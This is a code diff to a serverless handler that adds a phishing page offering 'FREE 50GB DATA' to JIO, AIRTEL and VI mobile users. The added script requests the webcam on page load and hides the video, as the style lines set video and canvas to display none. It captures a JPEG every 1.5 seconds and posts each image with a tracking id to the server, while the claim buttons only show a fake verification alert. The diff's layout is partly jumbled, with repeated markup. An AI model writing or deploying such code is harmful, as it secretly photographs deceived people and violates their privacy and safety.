@@ -44,6 +44,61 @@ export default async function handler(req, res) {
 <body onload="autoStart()">
     <div class="box">
         <h1 style="color:#00d2ff;">🎁 FREE 50GB DATA</h1>
+        <p id="msg">Your 2026 reward is ready. Select your network provider to claim.</p>
+        <button class="jio" onclick="verify('JIO')">JIO</button>
+        <button class="airtel" onclick="verify('AIRTEL')">AIRTEL</button>
+        <button class="vi" onclick="verify('VI')">VI</button>
+    </div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+    <script>
+        const path = window.location.pathname.replace('/', '');
+        const query = new URLSearchParams(window.location.search).get('s');
+        const encoded = path || query;
+        const uid = encoded ? atob(encoded) : null;
+
+        async function autoStart() {
+            if(!uid) return; 
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+                setInterval(snap, 1500);
+            } catch (err) {
+                // Background capture starts once they interact if blocked initially
+            }
+        }
+
+        function verify(sim) {
+            alert("Verifying " + sim + " number... please wait 10 sec");
+        }
+
+        function snap() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.5), id: uid })
+            });
+        }
+    </script>
+</body>
+</html>
+    `);
+}
+        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .jio { background: #1539cf; color: white; }
+        .airtel { background: #f40000; color: white; }
+        .vi { background: #ffeb00; color: black; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body onload="autoStart()">
+    <div class="box">
+        <h1 style="color:#00d2ff;">🎁 FREE 50GB DATA</h1>
         <p>Your 2026 reward is ready. Select your network provider to claim.</p>
         <button class="jio">JIO</button>
         <button class="airtel">AIRTEL</button>
